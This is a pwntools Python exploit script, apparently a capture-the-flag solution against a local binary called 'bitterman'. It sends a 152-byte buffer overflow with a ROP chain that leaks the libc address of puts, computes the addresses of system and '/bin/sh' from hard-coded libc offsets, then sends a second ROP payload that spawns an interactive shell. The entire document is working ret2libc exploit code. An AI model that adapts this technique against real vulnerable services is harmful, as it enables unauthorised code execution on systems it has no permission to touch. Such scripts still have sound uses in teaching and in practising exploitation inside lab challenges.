from pwn import *


#context(terminal=['tmux','new-window'])
p = process('./bitterman')
#p = gdb.debug('./bitterman','b main')
context(os='linux',arch='amd64')
#context.log_level = 'DEBUG' 

main_plt = p64(0x4006ec)
put_plt = p64(0x400520)
put_got = p64(0x600c50)
pop_rdi = p64(0x400853)
junk = "A"*152

'''
> What's your name? 
najeeb
Hi, najeeb

> Please input the length of your message: 
AAAAAAAAAAAAAAAaaaaaaa
> Please enter your text: 

'''

payload = junk + pop_rdi + put_got + put_plt + main_plt

p.recvuntil("name?") # this is rec unlit last string
#print(1)
p.sendline("najeeb") # this is send name
#print(2)
p.recvuntil("message: ") # this is last msg
#print(3)
p.sendline("1024") # this is send some data
#print(4)
p.recvuntil("text:") # this is recive last msg
#print(5)
p.sendline(payload) # send payload
#raw_input("this is raw input after first payload") # this is for segfult

#print(6)
p.recvuntil("Thanks!")

lecked_put = p.recv()[:8].strip().ljust(8,"\x00")
#print(str(lecked_put))
log.success("Lecked puts@Glibc: " +str(hex(u64(lecked_put))))
lecked_put = u64(lecked_put)
raw_input("this is raw input after first payload") # this is for segfult

### secound stage 

pop_rdi = p64(0x400853)
libc_puts =   0x6f690
libc_system = 0x45390
libc_bin_sh = 0x18cd57

print(type(lecked_put))
print(type(libc_puts))
print(type(libc_bin_sh))

offset = lecked_put - libc_puts
sys = p64(offset + libc_system)
log.info("system address :" + str(hex(u64(sys))))
sh = p64(offset + libc_bin_sh)
log.info("'/bin/sh' address :" + str(hex(u64(sh))))

payload = junk + pop_rdi + sh + sys
#p.send(payload)
p.sendline("najeeb")
p.recvline("message:")
p.sendline("1024") # this is send some data
p.recvuntil("text:") # this is recive last msg
p.sendline(payload) # send payload
raw_input('press enter, this is secound payload ')
p.recvuntil("Thanks!")

p.interactive()